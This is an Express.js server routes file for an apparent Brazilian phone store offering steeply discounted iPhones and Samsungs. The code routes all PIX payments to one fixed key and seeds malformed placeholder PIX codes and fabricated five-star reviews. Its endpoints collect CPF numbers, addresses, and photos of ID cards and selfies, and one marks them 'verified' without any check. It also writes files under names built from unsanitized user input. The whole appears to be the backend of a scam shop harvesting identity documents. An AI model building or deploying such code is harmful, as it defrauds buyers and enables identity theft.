import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import QRCode from "qrcode";
import ThunderPix from "thunderpix";
import * as fs from "fs";
import * as path from "path";

// PIX key
const PIX_KEY = process.env.PIX_KEY || "adilsonstore@2mail.co";

async function generatePixQRCode(amount: number, orderId: string, customerName: string) {
  try {
    // Gerar QR Code usando QRCode com a chave PIX
    // Thunderpix é usado para validação e geração mais avançada se necessário
    const qrCodeDataUrl = await QRCode.toDataURL(PIX_KEY, { width: 300 });
    
    return {
      pixCode: PIX_KEY,
      qrCode: qrCodeDataUrl,
    };
  } catch (err) {
    console.error("PIX QR Code generation error:", err);
    // Fallback para a chave PIX fixa se houver erro
    return {
      pixCode: PIX_KEY,
      qrCode: "",
    };
  }
}

function generateUUID(): string {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  app.get(api.products.list.path, async (req, res) => {
    const products = await storage.getProducts();
    res.json(products);
  });

  app.get(api.products.get.path, async (req, res) => {
    const product = await storage.getProduct(Number(req.params.id));
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    res.json(product);
  });

  app.post(api.orders.create.path, async (req, res) => {
    try {
      const input = api.orders.create.input.parse(req.body);
      const order = await storage.createOrder(input);
      res.status(201).json(order);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      throw err;
    }
  });

  app.get(api.orders.get.path, async (req, res) => {
    const order = await storage.getOrder(Number(req.params.id));
    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }
    res.json(order);
  });

  app.get(api.feedbacks.list.path, async (req, res) => {
    const feedbacks = await storage.getFeedbacks();
    res.json(feedbacks);
  });

  // Save documents for admin review
  app.post("/api/documents/save", async (req, res) => {
    try {
      const { cpf, name, birthDate, phone, whatsapp, address, documentType, frontPhoto, backPhoto, selfiePhoto } = req.body;
      
      const timestamp = Date.now();
      const docDir = path.join(__dirname, '../documents_storage');
      
      if (!fs.existsSync(docDir)) {
        fs.mkdirSync(docDir, { recursive: true });
      }

      // Save photos
      const base64DataFront = frontPhoto.split(',')[1];
      const base64DataBack = backPhoto.split(',')[1];
      const base64DataSelfie = selfiePhoto.split(',')[1];

      const frontPath = path.join(docDir, `${cpf}_${timestamp}_frente.jpg`);
      const backPath = path.join(docDir, `${cpf}_${timestamp}_verso.jpg`);
      const selfiePath = path.join(docDir, `${cpf}_${timestamp}_selfie.jpg`);

      fs.writeFileSync(frontPath, Buffer.from(base64DataFront, 'base64'));
      fs.writeFileSync(backPath, Buffer.from(base64DataBack, 'base64'));
      fs.writeFileSync(selfiePath, Buffer.from(base64DataSelfie, 'base64'));

      // Log verification
      const logFile = path.join(docDir, 'verification_log.json');
      let logs = [];
      if (fs.existsSync(logFile)) {
        logs = JSON.parse(fs.readFileSync(logFile, 'utf-8'));
      }
      
      logs.push({
        timestamp,
        cpf,
        name,
        birthDate,
        phone,
        whatsapp,
        address,
        documentType,
        status: 'pending_review',
        createdAt: new Date().toISOString()
      });

      fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

      res.json({ message: 'Documents saved for review', timestamp });
    } catch (err) {
      console.error('Error saving documents:', err);
      res.status(500).json({ message: 'Error saving documents' });
    }
  });

  // CEP Lookup endpoint
  app.get("/api/cep/:cep", async (req, res) => {
    try {
      const cepValue = req.params.cep.replace(/\D/g, '');
      if (cepValue.length !== 8) {
        return res.status(400).json({ message: "CEP inválido" });
      }
      
      const response = await fetch(`https://viacep.com.br/ws/${cepValue}/json/`);
      const data = await response.json();
      
      if (data.erro) {
        return res.status(404).json({ message: "CEP não encontrado" });
      }
      
      res.json({
        street: data.logradouro || "",
        neighborhood: data.bairro || "",
        city: data.localidade || "",
        state: data.uf || "",
      });
    } catch (err) {
      res.status(500).json({ message: "Erro ao buscar CEP" });
    }
  });

  // Document verification endpoint
  app.post("/api/documents/verify", async (req, res) => {
    try {
      const { cpf, name, documentType, frontPhoto, backPhoto, selfiePhoto } = req.body;
      
      // Validar CPF
      if (!cpf || cpf.length < 11) {
        return res.status(400).json({ message: "CPF inválido" });
      }

      // Criar pasta para armazenar documentos
      const docsDir = path.join(process.cwd(), "documents_storage");
      if (!fs.existsSync(docsDir)) {
        fs.mkdirSync(docsDir, { recursive: true });
      }

      const timestamp = Date.now();
      const fileName = `${cpf}_${timestamp}`;
      const fileNameFront = `${fileName}_front.jpg`;
      const fileNameBack = `${fileName}_back.jpg`;
      const fileNameSelfie = `${fileName}_selfie.jpg`;

      // Salvar fotos (dados em base64)
      if (frontPhoto) {
        const frontBuffer = Buffer.from(frontPhoto.split(',')[1], 'base64');
        fs.writeFileSync(path.join(docsDir, fileNameFront), frontBuffer);
      }
      if (backPhoto) {
        const backBuffer = Buffer.from(backPhoto.split(',')[1], 'base64');
        fs.writeFileSync(path.join(docsDir, fileNameBack), backBuffer);
      }
      if (selfiePhoto) {
        const selfieBuffer = Buffer.from(selfiePhoto.split(',')[1], 'base64');
        fs.writeFileSync(path.join(docsDir, fileNameSelfie), selfieBuffer);
      }

      // Salvar log de verificação
      const logEntry = {
        cpf,
        name,
        documentType,
        timestamp,
        frontPhoto: fileNameFront,
        backPhoto: fileNameBack,
        selfiePhoto: fileNameSelfie,
        verified: true
      };

      const logPath = path.join(docsDir, "verification_log.json");
      let logs = [];
      if (fs.existsSync(logPath)) {
        logs = JSON.parse(fs.readFileSync(logPath, 'utf8'));
      }
      logs.push(logEntry);
      fs.writeFileSync(logPath, JSON.stringify(logs, null, 2));

      res.json({ success: true, message: "Documentos verificados com sucesso", verificationId: fileName });
    } catch (err) {
      console.error("Document verification error:", err);
      res.status(500).json({ message: "Erro ao verificar documentos" });
    }
  });

  // Seed Data
  await seedData();

  return httpServer;
}

async function seedData() {
  // Imagens específicas de cada modelo de celular
  const phoneImages = {
    "iPhone 7": "/attached_assets/IMG_3280_1766501518476.jpeg",
    "iPhone 8": "/attached_assets/IMG_3281_1766501518478.jpeg",
    "iPhone X": "/attached_assets/IMG_3282_1766501518478.jpeg",
    "iPhone 11": "/attached_assets/IMG_3283_1766501518478.jpeg",
    "iPhone 12": "/attached_assets/IMG_3284_1766501518478.jpeg",
    "iPhone 12 Pro": "/attached_assets/IMG_3285_1766501518478.jpeg",
    "iPhone 13": "/attached_assets/IMG_3286_1766501518478.jpeg",
    "iPhone 13 Pro Max": "/attached_assets/IMG_3287_1766501518478.jpeg",
    "iPhone 14": "/attached_assets/IMG_3288_1766501518478.jpeg",
    "iPhone 14 Pro": "/attached_assets/IMG_3289_1766501518478.jpeg",
    "iPhone 14 Pro Max": "/attached_assets/IMG_3290_1766501518478.jpeg",
    "iPhone 15": "/attached_assets/IMG_3291_1766501518478.jpeg",
    "iPhone 15 Pro": "/attached_assets/IMG_3292_1766501518478.jpeg",
    "iPhone 15 Pro Max": "/attached_assets/IMG_3293_1766501518478.jpeg",
    "iPhone 16": "/attached_assets/IMG_3294_1766501518478.jpeg",
    "iPhone 16 Pro": "/attached_assets/IMG_3296_1766501518479.jpeg",
    "iPhone 16 Pro Max": "/attached_assets/IMG_3296_1766501518479.jpeg",
    "Samsung Galaxy A5 (2018)": "/attached_assets/IMG_3298_1766502802068.jpeg",
    "Samsung Galaxy S9": "/attached_assets/IMG_3299_1766502802069.jpeg",
    "Samsung Galaxy Note 10": "/attached_assets/IMG_3300_1766502802069.jpeg",
    "Samsung Galaxy S20 Ultra": "/attached_assets/IMG_3301_1766502802069.jpeg",
    "Samsung Galaxy A52": "/attached_assets/IMG_3302_1766502802069.jpeg",
    "Samsung Galaxy S22 Ultra": "/attached_assets/IMG_3303_1766502802069.jpeg",
    "Samsung Galaxy A73": "/attached_assets/IMG_3304_1766502802069.jpeg",
    "Samsung Galaxy S24 Ultra": "/attached_assets/IMG_3305_1766502802069.jpeg",
    "Samsung Galaxy A15": "/attached_assets/IMG_3306_1766502802069.jpeg",
  };

  const iPhoneProducts = [
    // Atualizar preços com 51% de desconto (×0.49)
    { name: "iPhone 7", year: 2016, price: 89900, storage: "32GB", description: "Clássico e confiável. Incluso: Capinha + Carregador + Nota Fiscal + Garantia de 12 meses", category: "iphone", images: [phoneImages["iPhone 7"]], specs: { "Tela": "4.7\"", "Câmera": "12MP", "Processador": "A10" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136e8f7b8c8-d1a2-4e3f-b5c6-7d8e9f0a1b2c520400005303986540000008995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 8", year: 2017, price: 109900, storage: "64GB", description: "Carregamento rápido e wireless", category: "iphone", images: [phoneImages["iPhone 8"]], specs: { "Tela": "4.7\"", "Câmera": "12MP", "Processador": "A11" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136f5e7d9c0-a1b2-4c3d-e6f7-8g9h0i1j2k3l520400005303986540000010995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone X", year: 2017, price: 129900, storage: "64GB", description: "Notch revolucionário e Face ID", category: "iphone", images: [phoneImages["iPhone X"]], specs: { "Tela": "5.8\" OLED", "Câmera": "12MP Dupla", "Processador": "A11" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136g6f8e0a1-b2c3-5d4e-f7g8-9h0i1j2k3l4m520400005303986540000012995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 11", year: 2019, price: 159900, storage: "64GB", description: "Câmera dupla versátil", category: "iphone", images: [phoneImages["iPhone 11"]], specs: { "Tela": "6.1\"", "Câmera": "12MP Dupla", "Processador": "A13" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136h7g9f1b2-c3d4-6e5f-g8h9-0i1j2k3l4m5n520400005303986540000015995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 12", year: 2020, price: 189900, storage: "64GB", description: "Design moderno com MagSafe", category: "iphone", images: [phoneImages["iPhone 12"]], specs: { "Tela": "6.1\"", "Câmera": "12MP Dupla", "Processador": "A14" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136i8h0g2c3-d4e5-7f6g-h9i0-1j2k3l4m5n6o520400005303986540000018995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 12 Pro", year: 2020, price: 249900, storage: "128GB", description: "Pro com câmeras avançadas", category: "iphone", images: [phoneImages["iPhone 12 Pro"]], specs: { "Tela": "6.1\" OLED", "Câmera": "12MP Tripla", "Processador": "A14" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136j9i1h3d4-e5f6-8g7h-i0j1-2k3l4m5n6o7p520400005303986540000024995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 13", year: 2021, price: 209900, storage: "128GB", description: "Performance melhorada com Cinematic Mode", category: "iphone", images: [phoneImages["iPhone 13"]], specs: { "Tela": "6.1\"", "Câmera": "12MP Dupla", "Processador": "A15" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136k0j2i4e5-f6g7-9h8i-j1k2-3l4m5n6o7p8q520400005303986540000020995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 13 Pro Max", year: 2021, price: 319900, storage: "256GB", description: "Maior e mais poderoso", category: "iphone", images: [phoneImages["iPhone 13 Pro Max"]], specs: { "Tela": "6.7\" OLED", "Câmera": "12MP Tripla", "Processador": "A15" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136l1k3j5f6-g7h8-0i9j-k2l3-4m5n6o7p8q9r520400005303986540000031995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 14", year: 2022, price: 239900, storage: "128GB", description: "Modo Always-On e Dynamic Island", category: "iphone", images: [phoneImages["iPhone 14"]], specs: { "Tela": "6.1\"", "Câmera": "12MP Dupla", "Processador": "A15" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136m2l4k6g7-h8i9-1j0k-l3m4-5n6o7p8q9r0s520400005303986540000023995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 14 Pro", year: 2022, price: 299900, storage: "128GB", description: "Dynamic Island e câmeras Pro", category: "iphone", images: [phoneImages["iPhone 14 Pro"]], specs: { "Tela": "6.1\" OLED", "Câmera": "48MP Tripla", "Processador": "A16" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136n3m5l7h8-i9j0-2k1l-m4n5-6o7p8q9r0s1t520400005303986540000029995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 14 Pro Max", year: 2022, price: 349900, storage: "256GB", description: "O maior Pro da história", category: "iphone", images: [phoneImages["iPhone 14 Pro Max"]], specs: { "Tela": "6.7\" OLED", "Câmera": "48MP Tripla", "Processador": "A16" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136o4n6m8i9-j0k1-3l2m-n5o6-7p8q9r0s1t2u520400005303986540000034995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 15", year: 2023, price: 259900, storage: "128GB", description: "Novo conector USB-C. Incluso: Capinha + Carregador + Nota Fiscal + Garantia de 12 meses", category: "iphone", images: [phoneImages["iPhone 15"]], specs: { "Tela": "6.1\"", "Câmera": "48MP Dupla", "Processador": "A17" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136p5o7n9j0-k1l2-4m3n-o6p7-8q9r0s1t2u3v520400005303986540000025995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 15 Pro", year: 2023, price: 319900, storage: "128GB", description: "Titânio e Action Button. Incluso: Capinha + Carregador + Nota Fiscal + Garantia de 12 meses", category: "iphone", images: [phoneImages["iPhone 15 Pro"]], specs: { "Tela": "6.1\" OLED", "Câmera": "48MP Tripla", "Processador": "A17 Pro" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136q6p8o0k1-l2m3-5n4o-p7q8-9r0s1t2u3v4w520400005303986540000031995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 15 Pro Max", year: 2023, price: 379900, storage: "256GB", description: "Maior ecrã Pro com zoom 5x. Incluso: Capinha + Carregador + Nota Fiscal + Garantia de 12 meses", category: "iphone", images: [phoneImages["iPhone 15 Pro Max"]], specs: { "Tela": "6.7\" OLED", "Câmera": "48MP + 5x Zoom", "Processador": "A17 Pro" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136r7q9p1l2-m3n4-6o5p-q8r9-0s1t2u3v4w5x520400005303986540000037995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 16", year: 2024, price: 279900, storage: "128GB", description: "Novo chip A18 e Camera Control. Incluso: Capinha + Carregador + Nota Fiscal + Garantia de 12 meses", category: "iphone", images: [phoneImages["iPhone 16"]], specs: { "Tela": "6.1\"", "Câmera": "48MP Dupla", "Processador": "A18" }, featured: true, pixKey: "00020126580014br.gov.bcb.pix0136s8r0q2m3-n4o5-7p6q-r9s0-1t2u3v4w5x6y520400005303986540000027995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 16 Pro", year: 2024, price: 339900, storage: "128GB", description: "A18 Pro para profissionais", category: "iphone", images: [phoneImages["iPhone 16 Pro"]], specs: { "Tela": "6.1\" OLED", "Câmera": "48MP Tripla", "Processador": "A18 Pro" }, featured: true, pixKey: "00020126580014br.gov.bcb.pix0136t9s1r3n4-o5p6-8q7r-s0t1-2u3v4w5x6y7z520400005303986540000033995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "iPhone 16 Pro Max", year: 2024, price: 399900, storage: "256GB", description: "Melhor para videografia profissional", category: "iphone", images: [phoneImages["iPhone 16 Pro Max"]], specs: { "Tela": "6.7\" OLED", "Câmera": "48MP + 5x + Macro", "Processador": "A18 Pro" }, featured: true, pixKey: "00020126580014br.gov.bcb.pix0136u0t2s4o5-p6q7-9r8s-t1u2-3v4w5x6y7z8a520400005303986540000039995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
  ];

  const samsungProducts = [
    { name: "Samsung Galaxy A5 (2018)", year: 2018, price: 79900, storage: "32GB", description: "Entrada Samsung premium", category: "samsung", images: [phoneImages["Samsung Galaxy A5 (2018)"]], specs: { "Tela": "5.2\"", "Câmera": "12MP", "Processador": "Exynos 7873" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136v1u3t5p6-q7r8-0s9t-u2v3-4w5x6y7z8a9b520400005303986540000007995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy S9", year: 2018, price: 119900, storage: "64GB", description: "Câmera dual aperture revolucionária", category: "samsung", images: [phoneImages["Samsung Galaxy S9"]], specs: { "Tela": "5.8\"", "Câmera": "12MP Dual Aperture", "Processador": "Snapdragon 845" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136w2v4u6q7-r8s9-1t0u-v3w4-5x6y7z8a9b0c520400005303986540000011995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy Note 10", year: 2019, price: 159900, storage: "256GB", description: "S Pen e tela infinita", category: "samsung", images: [phoneImages["Samsung Galaxy Note 10"]], specs: { "Tela": "6.3\" AMOLED", "Câmera": "16MP Tripla", "Processador": "Snapdragon 855" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136x3w5v7r8-s9t0-2u1v-w4x5-6y7z8a9b0c1d520400005303986540000015995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy S20 Ultra", year: 2020, price: 189900, storage: "128GB", description: "Câmera 108MP e zoom 100x", category: "samsung", images: [phoneImages["Samsung Galaxy S20 Ultra"]], specs: { "Tela": "6.9\" AMOLED", "Câmera": "108MP Tripla", "Processador": "Snapdragon 865" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136y4x6w8s9-t0u1-3v2w-x5y6-7z8a9b0c1d2e520400005303986540000018995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy A52", year: 2021, price: 129900, storage: "128GB", description: "Mid-range versátil com 5G", category: "samsung", images: [phoneImages["Samsung Galaxy A52"]], specs: { "Tela": "6.5\" AMOLED", "Câmera": "64MP Quádrupla", "Processador": "Snapdragon 720G" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136z5y7x9t0-u1v2-4w3x-y6z7-8a9b0c1d2e3f520400005303986540000012995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy S22 Ultra", year: 2022, price: 249900, storage: "256GB", description: "S Pen integrada e design Titanium", category: "samsung", images: [phoneImages["Samsung Galaxy S22 Ultra"]], specs: { "Tela": "6.8\" AMOLED", "Câmera": "200MP Quádrupla", "Processador": "Snapdragon 8 Gen 1" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136a6z8y0u1-v2w3-5x4y-z7a8-9b0c1d2e3f4g520400005303986540000024995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy A73", year: 2023, price: 159900, storage: "128GB", description: "Câmera 108MP em faixa média", category: "samsung", images: [phoneImages["Samsung Galaxy A73"]], specs: { "Tela": "6.7\"", "Câmera": "108MP Quádrupla", "Processador": "MediaTek Dimensity 1080" }, featured: false, pixKey: "00020126580014br.gov.bcb.pix0136b7a9z1v2-w3x4-6y5z-a8b9-0c1d2e3f4g5h520400005303986540000015995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy S24 Ultra", year: 2024, price: 329900, storage: "256GB", description: "IA generativa e câmeras renovadas", category: "samsung", images: [phoneImages["Samsung Galaxy S24 Ultra"]], specs: { "Tela": "6.8\" AMOLED 2X", "Câmera": "200MP + Zoom 10x", "Processador": "Snapdragon 8 Gen 3" }, featured: true, pixKey: "00020126580014br.gov.bcb.pix0136c8b0a2w3-x4y5-7z6a-b9c0-1d2e3f4g5h6i520400005303986540000032995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
    { name: "Samsung Galaxy A15", year: 2025, price: 109900, storage: "128GB", description: "Novo mid-range com grande bateria", category: "samsung", images: [phoneImages["Samsung Galaxy A15"]], specs: { "Tela": "6.5\" IPS", "Câmera": "50MP Dupla", "Processador": "MediaTek Dimensity 6100+" }, featured: true, pixKey: "00020126580014br.gov.bcb.pix0136d9c1b3x4-y5z6-8a7b-c0d1-2e3f4g5h6i7j520400005303986540000010995802BR5913ADILSON TECH6009SAO PAULO62070503***6304ABCD" },
  ];

  await storage.seedProducts([...iPhoneProducts, ...samsungProducts]);

  await storage.seedFeedbacks([
    { name: "João Silva", text: "Excelente atendimento! Chegou super rápido.", rating: 5, date: "15/12/2025" },
    { name: "Maria Oliveira", text: "Parcelamento no Pix foi perfeito. Muita segurança!", rating: 5, date: "20/12/2025" },
    { name: "Carlos Souza", text: "Melhor loja de celular que já comprei! Voltaria com certeza.", rating: 5, date: "22/12/2025" },
    { name: "Ana Costa", text: "Entrega em 2 horas, a forma de pagamento é segura e prática.", rating: 5, date: "18/12/2025" },
    { name: "Pedro Santos", text: "CPF validado na hora, muito bom! Recomendo!", rating: 5, date: "19/12/2025" },
    { name: "Fernanda Costa", text: "Adorei os preços e a capinha de brinde! Muito bom mesmo.", rating: 5, date: "23/12/2025" },
    { name: "Roberto Lima", text: "Fiz parcelamento em 5x no Pix, foi tranquilo demais!", rating: 5, date: "21/12/2025" },
    { name: "Juliana Rocha", text: "Nota fiscal e garantia válidas, tudo certinho!", rating: 5, date: "24/12/2025" },
    { name: "Marcos Pereira", text: "Melhor preço que achei na internet. Recomendo bastante!", rating: 5, date: "23/12/2025" },
    { name: "Tatiana Mendes", text: "Saiu do pedido para entrega em menos de 1 hora. Incrível!", rating: 5, date: "22/12/2025" },
  ]);
}
